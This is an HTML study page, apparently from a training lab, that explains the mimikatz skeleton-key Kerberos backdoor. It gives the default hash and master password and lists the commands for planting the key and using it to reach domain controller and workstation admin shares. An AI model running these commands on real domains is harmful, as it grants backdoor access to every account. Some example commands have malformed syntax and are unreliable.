<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Kerberos Backdoors w/ mimikatz</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Kerberos Backdoors w/ mimikatz</h1><br/>             <small>Along  with maintaining access using golden and silver tickets mimikatz has  one other trick up its sleeves when it comes to attacking Kerberos.  Unlike the golden and silver ticket attacks a Kerberos backdoor is much  more subtle because it acts similar to a rootkit by implanting itself  into the memory of the domain forest allowing itself access to any of  the machines with a master password. </small><br />The  Kerberos backdoor works by implanting a skeleton key that abuses the  way that the AS-REQ validates encrypted timestamps. A skeleton key only  works using Kerberos RC4 encryption. <br />The default hash for a mimikatz skeleton key is  <em>60BA4FCADC466C7A033C178194C03DF6</em> which makes the password -&quot;<em>mimikatz</em>&quot;<br />This  will only be an overview section and will not require you to do  anything on the machine however I encourage you to continue yourself and  add other machines and test using skeleton keys with mimikatz.<br /><h2>Skeleton Key Overview -</h2><br />The  skeleton key works by abusing the AS-REQ encrypted timestamps as I said  above, the timestamp is encrypted with the users NT hash. The domain  controller then tries to decrypt this timestamp with the users NT hash,  once a skeleton key is implanted the domain controller tries to decrypt  the timestamp using both the user NT hash and the <small>skeleton key NT hash allowing you access to the domain forest.</small><br /><a href="https://i.imgur.com/yNI0zEb.png"><img src="images/73-1.png" alt="images/73-1.png" /></a><br /><h2>Preparing Mimikatz - </h2><br /><small>1.) </small><code>cd Downloads &amp;&amp; mimikatz.exe</code> - Navigate to the directory mimikatz is in and run mimikatz<br />2.) <code>privilege::debug</code> - This should be a standard for running mimikatz as mimikatz needs local administrator access<br /><a href="https://i.imgur.com/ZPOMDMo.png"><img src="images/73-2.png" alt="images/73-2.png" /></a><br /><br /><h2>Installing the Skeleton Key w/ mimikatz -</h2><br /><small>1.) </small><code>misc::skeleton</code> - Yes! that&#39;s it but don&#39;t underestimate this small command it is very powerful<br /><a href="https://i.imgur.com/wI802gw.png"><img src="images/73-3.png" alt="images/73-3.png" /></a><br /><br /><h2>Accessing the forest - </h2><br /><h3>The default credentials will be: &quot;</h3><em><h3>mimikatz</h3></em><h3>&quot;</h3><br /><br /><small>example: </small><code>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz</code> - The share will now be accessible without the need for the Administrators password<br />example: <code>dir \\Desktop-1\c$ /user:Machine1 mimikatz</code> - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1<br />The  skeleton key will not persist by itself because it runs in the memory,  it can be scripted or persisted using other tools and techniques however  that is out of scope for this room.<br /><br />        <br />                            <br /><br /></div></body></html>